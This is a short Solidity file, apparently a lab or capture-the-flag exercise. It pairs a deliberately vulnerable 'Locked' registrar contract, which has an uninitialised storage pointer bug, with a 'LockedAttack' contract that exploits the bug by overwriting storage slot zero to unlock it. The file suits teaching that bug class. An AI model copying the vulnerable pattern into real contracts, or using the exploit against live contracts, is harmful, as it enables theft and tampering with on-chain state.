pragma solidity ^0.4.24;

// A Locked Name Registrar
contract Locked {

    bool public unlocked = false;  // registrar locked, no name updates

    struct NameRecord { // map hashes to addresses
        bytes32 name; //
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // records who registered names
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses

    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress;

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord;

        require(unlocked); // only allow registrations if contract is unlocked
    }
}




contract LockedAttack {

    Locked victim;

    constructor(address _victim) public {
        victim = Locked(_victim);

    }

    //victim is vulnerable to an exploit due to an uninitialised storage pointer that
    //writes the new struct to slot zero of contract state, overriding the previous unlocked = false
    function attack() external returns(bool success) {
        victim.register(0x0000000000000000000000000000000000000000000000000000000000000001, 0x042);
        return true;
    }

}
